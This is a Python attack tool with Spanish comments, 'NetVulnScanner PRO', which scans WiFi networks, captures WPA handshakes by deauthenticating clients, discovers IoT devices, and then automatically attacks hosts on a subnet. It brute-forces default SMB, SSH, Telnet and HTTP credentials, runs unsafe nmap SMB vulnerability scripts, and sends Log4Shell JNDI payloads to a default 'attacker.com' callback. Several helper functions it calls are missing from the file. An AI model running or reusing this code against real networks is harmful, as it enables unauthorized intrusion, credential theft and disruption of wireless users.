#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NetVulnScanner PRO - Escáner de Redes + WiFi + IoT + Explotación
Uso exclusivo en redes autorizadas.
"""

import nmap
import socket
import subprocess
import requests
import json
import time
import threading
import ipaddress
import re
import os
import sys
from netifaces import interfaces, ifaddresses, AF_INET
from datetime import datetime
import argparse

# ========================================================
# CONFIGURACIÓN
# ========================================================
SCAN_PORTS = [21, 22, 23, 25, 80, 443, 445, 554, 3306, 3389, 5900, 8080, 8443, 139, 445, 8008, 8009]
NVD_API_KEY = ""  # Opcional
TIMEOUT = 5

# Diccionarios para fuerza bruta
DEFAULT_CREDS = {
    'ssh': [('root','root'), ('admin','admin'), ('root','password'), ('admin','password')],
    'telnet': [('root','root'), ('admin','admin'), ('root','password'), ('admin','password')],
    'http': [('admin','admin'), ('admin','password'), ('root','root'), ('user','user')],
    'smb': [('Administrator',''), ('Administrator','admin'), ('Administrator','password')]
}

# ========================================================
# FUNCIONES DE RED (WiFi)
# ========================================================
def scan_wifi(interface='wlan0', timeout=30):
    """
    Escanea redes WiFi usando airodump-ng.
    Devuelve lista de dicts con BSSID, canal, ESSID, cifrado, etc.
    """
    print(f"[*] Escaneando WiFi en {interface} durante {timeout}s...")
    # Asegurar que la interfaz está en modo monitor
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], stderr=subprocess.DEVNULL)
    subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'type', 'monitor'], stderr=subprocess.DEVNULL)
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], stderr=subprocess.DEVNULL)

    # Ejecutar airodump-ng y guardar salida en archivo csv
    csv_file = '/tmp/airodump_output.csv'
    cmd = ['sudo', 'airodump-ng', interface, '--output-format', 'csv', '-w', '/tmp/airodump', '--write-interval', '1']
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(timeout)
    proc.terminate()
    time.sleep(2)

    # Parsear el archivo CSV generado (airodump-01.csv)
    csv_path = '/tmp/airodump-01.csv'
    networks = []
    if os.path.exists(csv_path):
        with open(csv_path, 'r') as f:
            lines = f.readlines()
            # Buscar la sección de redes (encabezado: "BSSID, ...")
            in_networks = False
            for line in lines:
                if line.startswith('BSSID'):
                    in_networks = True
                    continue
                if in_networks and line.strip() and not line.startswith('Station'):
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip()
                        encryption = parts[5].strip()
                        if essid and essid != '':
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'essid': essid,
                                'encryption': encryption
                            })
        os.remove(csv_path)
        os.remove('/tmp/airodump-01.csv')  # limpiar
    print(f"[+] Encontradas {len(networks)} redes WiFi.")
    return networks

def capture_handshake(interface='wlan0', bssid=None, channel=None, timeout=60):
    """
    Captura handshake WPA para una BSSID específica.
    Necesita airodump-ng y aireplay-ng.
    """
    if not bssid or not channel:
        print("[!] Se requiere BSSID y canal.")
        return None
    print(f"[*] Intentando capturar handshake para {bssid} en canal {channel}...")
    # Lanzar airodump en segundo plano
    capture_file = '/tmp/handshake_capture'
    cmd_airodump = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', capture_file, interface]
    proc = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    # Deautenticar para forzar reconexión
    cmd_deauth = ['sudo', 'aireplay-ng', '-0', '5', '-a', bssid, interface]
    subprocess.run(cmd_deauth, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    proc.terminate()
    # Verificar si se capturó handshake (buscar archivo .cap)
    cap_file = f"{capture_file}-01.cap"
    if os.path.exists(cap_file):
        # Verificar con aircrack-ng si tiene handshake
        result = subprocess.run(['aircrack-ng', cap_file], capture_output=True, text=True)
        if '1 handshake' in result.stdout or 'WPA handshake' in result.stdout:
            print(f"[+] Handshake capturado: {cap_file}")
            return cap_file
        else:
            print("[-] No se capturó handshake.")
            os.remove(cap_file)
    return None

# ========================================================
# DETECCIÓN DE IoT (UPnP, SSDP, mDNS)
# ========================================================
def discover_upnp(timeout=5):
    """
    Descubre dispositivos UPnP/SSDP en la red local.
    Envía M-SEARCH a 239.255.255.250:1900.
    """
    print("[*] Buscando dispositivos UPnP/SSDP...")
    devices = []
    try:
        from scapy.all import IP, UDP, Raw, srloop
        # Construir paquete M-SEARCH
        msg = (
            "M-SEARCH * HTTP/1.1\r\n"
            "HOST: 239.255.255.250:1900\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            "MX: 3\r\n"
            "ST: ssdp:all\r\n"
            "\r\n"
        )
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        sock.settimeout(timeout)
        sock.sendto(msg.encode(), ('239.255.255.250', 1900))
        start = time.time()
        while time.time() - start < timeout:
            try:
                data, addr = sock.recvfrom(1024)
                if data:
                    # Extraer información básica
                    lines = data.decode(errors='ignore').split('\r\n')
                    location = None
                    server = None
                    for line in lines:
                        if line.lower().startswith('location:'):
                            location = line.split(':', 1)[1].strip()
                        elif line.lower().startswith('server:'):
                            server = line.split(':', 1)[1].strip()
                    if location:
                        devices.append({
                            'ip': addr[0],
                            'port': addr[1],
                            'location': location,
                            'server': server
                        })
            except:
                break
        sock.close()
    except Exception as e:
        print(f"[!] Error en UPnP: {e}")
    print(f"[+] Encontrados {len(devices)} dispositivos UPnP.")
    return devices

def discover_mdns(timeout=5):
    """
    Descubre servicios mDNS (Bonjour) usando consulta DNS-SD.
    """
    print("[*] Buscando dispositivos mDNS (Bonjour)...")
    devices = []
    try:
        # Usamos socket para enviar consulta multicast a 224.0.0.251:5353
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        sock.settimeout(timeout)
        # Consulta por _services._dns-sd._udp.local
        query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01'
        sock.sendto(query, ('224.0.0.251', 5353))
        start = time.time()
        while time.time() - start < timeout:
            try:
                data, addr = sock.recvfrom(1024)
                # Parseo simple: buscar nombres de servicio
                # (implementación básica)
                if addr[0] not in [d['ip'] for d in devices]:
                    devices.append({'ip': addr[0], 'service': 'mDNS'})
            except:
                break
        sock.close()
    except Exception as e:
        print(f"[!] Error en mDNS: {e}")
    print(f"[+] Encontrados {len(devices)} dispositivos mDNS.")
    return devices

# ========================================================
# EXPLOTACIÓN DE SERVICIOS
# ========================================================
from impacket import smbconnection
import paramiko
import telnetlib
import base64

def exploit_smb(host, port=445):
    """
    Prueba vulnerabilidades SMB: EternalBlue (MS17-010) y SMBGhost (CVE-2020-0796).
    También prueba credenciales por defecto.
    """
    print(f"[*] Probando SMB en {host}:{port}")
    # 1. Credenciales por defecto
    for user, pwd in DEFAULT_CREDS['smb']:
        try:
            conn = smbconnection.SMBConnection(host, host, timeout=5)
            conn.login(user, pwd)
            print(f"[+] Credenciales válidas SMB: {user}:{pwd}")
            conn.close()
            return True
        except:
            pass
    # 2. Detectar vulnerabilidades (usando nmap scripts)
    nm = nmap.PortScanner()
    nm.scan(host, arguments='-p 445 --script smb-vuln* --script-args=unsafe=1')
    if host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            for port in nm[host][proto]:
                if nm[host][proto][port].get('script'):
                    scripts = nm[host][proto][port]['script']
                    for script_id, output in scripts.items():
                        if 'VULNERABLE' in output or 'vulnerable' in output:
                            print(f"[!] {host}:{port} - {script_id} - {output[:200]}")
    return False

def exploit_ssh(host, port=22):
    """
    Fuerza bruta SSH con credenciales comunes.
    """
    print(f"[*] Probando SSH en {host}:{port}")
    for user, pwd in DEFAULT_CREDS['ssh']:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=pwd, timeout=5)
            print(f"[+] Credenciales SSH válidas: {user}:{pwd}")
            client.close()
            return True
        except:
            continue
    return False

def exploit_telnet(host, port=23):
    """
    Fuerza bruta Telnet con credenciales comunes.
    """
    print(f"[*] Probando Telnet en {host}:{port}")
    for user, pwd in DEFAULT_CREDS['telnet']:
        try:
            tn = telnetlib.Telnet(host, port, timeout=5)
            tn.read_until(b"login:", timeout=3)
            tn.write(user.encode() + b"\n")
            tn.read_until(b"Password:", timeout=3)
            tn.write(pwd.encode() + b"\n")
            # Esperar prompt
            response = tn.read_some()
            if b'#' in response or b'$' in response or b'>' in response:
                print(f"[+] Credenciales Telnet válidas: {user}:{pwd}")
                tn.close()
                return True
            tn.close()
        except:
            continue
    return False

def exploit_http_auth(host, port=80):
    """
    Prueba credenciales HTTP Basic/Digest en /admin, /cgi-bin, etc.
    """
    print(f"[*] Probando HTTP Auth en {host}:{port}")
    for user, pwd in DEFAULT_CREDS['http']:
        try:
            url = f"http://{host}:{port}/admin"
            r = requests.get(url, auth=(user, pwd), timeout=5)
            if r.status_code == 200:
                print(f"[+] Credenciales HTTP válidas: {user}:{pwd} en {url}")
                return True
            url = f"http://{host}:{port}/cgi-bin"
            r = requests.get(url, auth=(user, pwd), timeout=5)
            if r.status_code == 200:
                print(f"[+] Credenciales HTTP válidas: {user}:{pwd} en {url}")
                return True
        except:
            continue
    return False

def exploit_log4shell(host, port, callback_url='http://attacker.com/exploit'):
    """
    Prueba CVE-2021-44228 (Log4Shell) enviando payload en parámetros HTTP.
    """
    print(f"[*] Probando Log4Shell en {host}:{port}")
    try:
        payload = f"${{jndi:ldap://{callback_url}/a}}"
        headers = {'User-Agent': payload, 'X-Forwarded-For': payload}
        r = requests.get(f"http://{host}:{port}/", headers=headers, timeout=5)
        # Si el servidor responde con error o diferente, no es indicativo.
        # Solo un callback externo confirmaría. Aquí solo registramos intento.
        print(f"[+] Enviado payload Log4Shell a {host}:{port}")
        return True
    except:
        return False

# ========================================================
# FUNCIÓN PRINCIPAL INTEGRADA
# ========================================================
def main():
    parser = argparse.ArgumentParser(description='NetVulnScanner PRO')
    parser.add_argument('--wifi', action='store_true', help='Escanear redes WiFi')
    parser.add_argument('--iot', action='store_true', help='Detectar dispositivos IoT (UPnP/mDNS)')
    parser.add_argument('--exploit', action='store_true', help='Ejecutar pruebas de explotación en hosts descubiertos')
    parser.add_argument('--all', action='store_true', help='Ejecutar todos los módulos')
    parser.add_argument('--interface', default='wlan0', help='Interfaz WiFi para escaneo')
    parser.add_argument('--subnet', help='Subred para escaneo de red (ej. 192.168.1.0/24)')
    args = parser.parse_args()

    if not any(vars(args).values()):
        parser.print_help()
        return

    print("="*60)
    print("    NETVULNSCANNER PRO - Módulos avanzados")
    print("    Uso autorizado solamente.")
    print("="*60)

    # Si se pide WiFi
    if args.wifi or args.all:
        networks = scan_wifi(interface=args.interface)
        if networks:
            print("\nRedes WiFi encontradas:")
            for net in networks:
                print(f"  {net['bssid']} | CH {net['channel']} | {net['encryption']} | {net['essid']}")
            # Opcional: capturar handshake de una red (preguntar)
            if input("¿Capturar handshake de alguna red? (s/n): ").lower() == 's':
                bssid = input("BSSID: ")
                channel = input("Canal: ")
                capture_handshake(args.interface, bssid, channel)

    # Detección IoT
    if args.iot or args.all:
        upnp_devs = discover_upnp()
        mdns_devs = discover_mdns()
        iot_devices = upnp_devs + mdns_devs
        if iot_devices:
            print("\nDispositivos IoT detectados:")
            for dev in iot_devices:
                print(f"  {dev.get('ip', '')} - {dev.get('server', '')} - {dev.get('location', '')}")

    # Escaneo de red y explotación
    if args.exploit or args.all:
        # Obtener subred si no se especifica
        if args.subnet:
            subnet = ipaddress.IPv4Network(args.subnet, strict=False)
        else:
            ip = get_local_ip()
            if not ip:
                print("[!] No se pudo obtener IP local.")
                return
            subnet = ipaddress.IPv4Network(f"{ip}/24", strict=False)
        print(f"[*] Escaneando subred {subnet} para explotación...")
        hosts = discover_hosts(subnet)
        for host in hosts:
            print(f"\n--- Explotando {host} ---")
            # Escanear puertos comunes
            services = scan_ports(host, SCAN_PORTS)
            for port, info in services.items():
                if info['state'] != 'open':
                    continue
                service = info['name']
                if service == 'smb' and port in [139,445]:
                    exploit_smb(host, port)
                elif service == 'ssh':
                    exploit_ssh(host, port)
                elif service == 'telnet':
                    exploit_telnet(host, port)
                elif service in ['http','https']:
                    exploit_http_auth(host, port)
                    # Log4Shell en servicios web
                    exploit_log4shell(host, port)
                elif service == 'http-alt' and port in [8008,8009]:
                    # Abrir URL en Chromecast (ya implementado en función original)
                    from netvulnscanner import open_url_on_device
                    open_url_on_device(host, port, "https://www.google.com")

if __name__ == "__main__":
    main()
